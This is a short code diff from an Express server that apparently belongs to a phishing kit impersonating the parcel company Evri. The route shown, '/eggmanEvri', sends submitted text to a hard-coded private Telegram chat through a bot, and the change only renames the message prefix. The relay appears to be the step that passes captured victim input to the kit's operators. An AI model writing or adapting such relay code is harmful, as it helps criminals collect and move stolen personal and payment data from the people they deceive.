@@ -7482,7 +7482,7 @@ app.post("/eggmanEvri", (req, res) => {
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
           {
             chat_id: 680379375,
-            text: `EvriTriz:\n${originalText}`,
+            text: `EvriEggman:\n${originalText}`,
             parse_mode: "Markdown",
           }
         )
